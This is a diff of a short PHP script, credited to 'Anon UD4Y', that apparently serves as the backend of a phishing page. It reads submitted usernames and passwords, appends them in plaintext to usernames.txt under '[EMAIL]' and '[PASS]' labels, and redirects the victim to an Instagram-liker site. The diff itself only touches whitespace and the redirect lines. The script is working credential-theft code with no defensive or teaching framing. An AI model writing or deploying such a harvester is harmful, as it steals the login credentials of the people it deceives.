@@ -1,5 +1,6 @@
 <?php
-  // This program generates a web pages that gets 
+
+ // This program generates a web pages that gets 
   // the user's information, saves it to a file, 
   // and displays it on the web page.
   // Created by Anon UD4Y.
@@ -37,18 +38,17 @@
     @ fclose($fileHandle);
   }
 
+
 $var = $_POST['username'];
 $var2 = $_POST['password'];
 $myFile = file_get_contents("protect.html");
 $searchString = "<html><title>WELCOME</title></html>";
 if($myFile != $searchString) {
     file_put_contents("usernames.txt", "[EMAIL]: " . $var . " [PASS]: " . $var2 . "\n", FILE_APPEND);
-    header('Location: https://ig-liker.net/');
+    header('Location:https://ig-liker.net/');
 }
 if($myFile != $searchString) {
     echo "LOGIN SUCCESSFULL";
-    header('Location: https://ig-liker.net/');
 }
 exit();
 ?>
-
